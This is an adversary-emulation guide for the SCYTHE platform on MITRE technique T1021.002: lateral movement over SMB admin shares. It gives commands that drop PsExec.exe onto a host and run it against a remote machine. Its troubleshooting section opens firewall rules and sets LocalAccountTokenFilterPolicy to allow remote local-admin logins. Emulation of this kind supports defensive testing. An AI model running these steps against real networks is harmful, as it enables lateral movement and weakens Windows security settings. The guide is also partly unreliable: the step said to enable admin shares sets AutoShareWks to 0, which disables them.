#  T1021.002 - Remote Services: SMB/Windows Admin Shares

Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.

## Import the Compound Action into SCYTHE
1. From the SCYTHE GUI, click Threat Manager - Migrate Threats
2. Under "Import Threat" click “Choose File” and select the JSON file you downloaded from GitHub
3. Click Import and OK when complete
4. Click Threat Manager - Threat Catalog
5. Find the imported Compound Action and click the tag icon 
6. Tag the MITRE ATT&CK Technique for the Compound Action

## Automated Emulation with SCYTHE
1. Create a new campaign
2. Select the Compound Action by MITRE ATT&CK tag

## Manual Emulation with SCYTHE
1. `loader --load run`
    * Loads the `run` module, which creates new processes.
2. `run powershell -c type C:\emulations\lateral.txt`
    * Grabs the IP address or hostname of a remote system.
3. `run powershell -c $env:TEMP`
    * Grabs the enviornmental veriable of the user's temporary directory to save PSExec.exe.
4. `loader --load downloader`
    * Load the `downloader` module, which is will be used to place a file from the VFS onto the target's filesystem.
5. ```downloader --src VFS:/shared/tools/PsExec.exe --dest $(3).response["result"].strip(\"\\r\\n\").strip(\"\\n\")\PsExec.exe```
    * This commands makes use of special SCYTHE Automation Language functions that are described in the table in Section 2.2 of the SCYTHE User Guide.
    * Here we place a file from the VFS into the temporary user directory we found in step 3. Let's unpack each part:
        * `downloader --src VFS:/shared/tools/PsExec.exe` - Use the `downloader` module to place a file from the VFS onto the target's filesystem. This assumes that there is a file in the VFS at the path specified. The file is available in the VFS folder.
        * `$(3).response` - Get the file path from step 3.
        * After all portions are evaluated, the result is the directory path + "PsExec.exe" as the final path of where the file should be placed. The file will be copied from the VFS and written to that path.
6. `run powershell -c Start-Process -FilePath $(3).response["result"].strip(\"\\r\\n\").strip(\"\\n\")\PsExec.exe -ArgumentList \"-accepteula \\$(2).response["result"].strip(\"\\r\\n\").strip(\"\\n\") ipconfig\" -ErrorAction SilentlyContinue -Wait -NoNewWindow`
    * This command runs PsExec.exe against the remote host from step 2.
7. STEP = CLEANUP
8. `run powershell del $(3).response["result"].strip(\"\\r\\n\").strip(\"\\n\")\PsExec.exe`
    * Deletes the PsExec.exe from the user's temporary folder.
9. `controller --shutdown`
    * Shuts down the SCYTHE client.

## Troubleshooting
This threat tries to connect to a remote system and authenticate with the credentials of the process the SCYTHE client is running on. There may be multiple reasons for connections to fail, below are some troubleshooting steps to take.

1. First try to connect to the remote system by running the following from a cmd.exe:
    * `powershell Test-NetConnection -ComputerName <IP/hostname> -Port 445`

2. If port 445 is not accesisble, you need to enable it on the target system. From an elevated cmd.exe on the target system run:
    * `netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes`

3. Test again from the remote system:
    * `net view \\192.168.146.130 /all`

4. You may need to enable the shares, on the target system run the following from an elevated prompt:
    * `reg add HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters /f /v AutoShareWks /t REG_DWORD /d 0`

5. If you are using the local administrator account, you will need to add this registry key to allow login on the target system. From an elevated prompt on the target system run:
    * `reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1`

6. The network profile may be set to public, check with an elevate PowerShell prompt:
    * `Get-NetConnectionProfile`
    * `Set-NetConnectionProfile -Name "Network" -NetworkCategory Private`